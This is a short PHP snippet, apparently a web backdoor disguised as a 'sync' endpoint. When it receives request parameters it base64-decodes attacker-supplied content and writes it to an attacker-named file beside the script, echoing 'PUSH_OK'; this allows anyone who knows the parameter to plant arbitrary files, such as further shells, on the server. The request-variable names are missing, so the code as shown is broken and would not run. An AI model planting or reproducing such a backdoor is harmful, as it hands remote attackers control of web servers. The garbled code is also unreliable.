<?php if(isset(['sync_me'])){ if(isset(['p'])){ file_put_contents(__DIR__.'/'.['p'], base64_decode(['c'])); echo 'PUSH_OK'; }else{ echo 'READY_FOR_SYNC'; } exit; } ?>
